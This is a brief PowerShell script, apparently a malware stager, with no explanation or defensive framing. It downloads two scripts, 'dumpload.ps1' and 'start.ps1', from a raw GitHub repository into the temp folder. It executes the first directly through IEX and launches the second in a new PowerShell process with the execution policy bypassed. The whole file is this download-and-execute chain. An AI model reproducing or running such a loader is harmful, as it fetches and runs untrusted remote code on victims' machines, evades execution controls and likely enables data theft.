$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/dumpload.ps1"
$output6 = "$env:TEMP\dump.ps1"
Invoke-WebRequest -Uri $url6 -OutFile $output6
IEX (Get-Content $output6 | Out-String)
# URL of the PowerShell script to download
$url = "https://raw.githubusercontent.com/cia168168/folder/main/start.ps1"
# Output path for downloaded script
$output = "$env:TEMP\start.ps1"

# Download the PowerShell script
Invoke-WebRequest -Uri $url -OutFile $output

# Open a new PowerShell process
$psProcess = New-Object System.Diagnostics.ProcessStartInfo
$psProcess.FileName = "powershell.exe"
$psProcess.Arguments = "-ExecutionPolicy Bypass -File $output"

# Start the process
$process = [System.Diagnostics.Process]::Start($psProcess)

# Wait for the process to finish
$process.WaitForExit()
